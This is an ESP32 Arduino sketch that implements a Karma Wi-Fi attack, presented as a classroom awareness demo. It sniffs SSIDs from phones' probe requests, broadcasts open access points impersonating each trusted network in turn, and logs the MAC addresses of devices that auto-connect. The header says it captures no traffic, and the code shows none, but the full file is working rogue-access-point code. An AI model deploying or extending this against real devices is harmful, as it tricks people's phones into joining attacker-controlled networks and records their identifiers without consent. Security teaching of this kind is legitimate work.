// karma_demo.ino
// Minimal Karma-attack demonstrator: hears trusted SSIDs, impersonates them one at a time.
// Classroom awareness use only, with consent. Grants no internet, captures no traffic.

#include <WiFi.h>
#include "esp_wifi.h"

#define MAX_NAMES 20
String trusted[MAX_NAMES];
int nameCount = 0;
int impersonateIdx = 0;
unsigned long lastSwap = 0;
const unsigned long SWAP_MS = 8000;   // impersonate each heard name for 8s
int sniffChannel = 1;

// --- collect a heard SSID (deduplicated) ---
void remember(const String& s) {
  if (s.length() == 0) return;
  for (int i = 0; i < nameCount; i++) if (trusted[i] == s) return;
  if (nameCount < MAX_NAMES) {
    trusted[nameCount++] = s;
    Serial.printf("[HEARD]  A phone here trusts: \"%s\"  (now impersonatable)\n", s.c_str());
  }
}

// --- promiscuous callback: pull SSID out of probe requests ---
void sniffer(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_MGMT) return;
  const wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  const uint8_t* p = pkt->payload;
  if (((p[0] & 0xF0) >> 4) != 4) return;      // subtype 4 = probe request
  const uint8_t* tag = p + 24;
  if (tag[0] != 0) return;                     // tag 0 = SSID
  uint8_t len = tag[1];
  if (len == 0 || len > 32) return;            // skip broadcast/wildcard probes
  String ssid = "";
  for (int i = 0; i < len; i++) ssid += (char)tag[2 + i];
  remember(ssid);
}

void startSniffing() {
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&sniffer);
  esp_wifi_set_channel(sniffChannel, WIFI_SECOND_CHAN_NONE);
}

void impersonate(const String& name) {
  esp_wifi_set_promiscuous(false);             // stop sniffing while we broadcast
  WiFi.mode(WIFI_AP);
  WiFi.softAP(name.c_str());                   // OPEN AP named exactly like a trusted net
  Serial.printf("\n>>> KARMA: now broadcasting fake OPEN AP \"%s\"\n", name.c_str());
  Serial.println(">>> Watch for a phone to AUTO-CONNECT (no tapping!)...");
}

int lastClientCount = 0;
void reportClients() {
  wifi_sta_list_t list;
  esp_wifi_ap_get_sta_list(&list);
  if (list.num > lastClientCount) {
    uint8_t* m = list.sta[list.num - 1].mac;
    Serial.printf("!!! TOOK THE BAIT: device %02X:%02X:%02X:%02X:%02X:%02X auto-joined \"%s\"\n",
                  m[0],m[1],m[2],m[3],m[4],m[5], trusted[impersonateIdx].c_str());
  }
  lastClientCount = list.num;
}

void setup() {
  Serial.begin(115200);
  delay(400);
  Serial.println("\n=== Karma Demo: listening for trusted network names ===");
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  startSniffing();
  lastSwap = millis();
}

void loop() {
  // Phase 1: while we have nothing to impersonate, keep sniffing + channel hopping
  if (nameCount == 0) {
    delay(400);
    sniffChannel = (sniffChannel % 11) + 1;
    esp_wifi_set_channel(sniffChannel, WIFI_SECOND_CHAN_NONE);

    static unsigned long lastHeartbeat = 0;
    if (millis() - lastHeartbeat >= 5000) {
      lastHeartbeat = millis();
      Serial.printf("... still listening for trusted network names (channel %d)\n", sniffChannel);
    }
    return;
  }

  // Phase 2: cycle through heard names, impersonating each for a while
  static bool broadcasting = false;
  if (!broadcasting || millis() - lastSwap > SWAP_MS) {
    impersonateIdx = (impersonateIdx + 1) % nameCount;
    impersonate(trusted[impersonateIdx]);
    lastClientCount = 0;
    broadcasting = true;
    lastSwap = millis();
  }
  reportClients();
  delay(500);
}
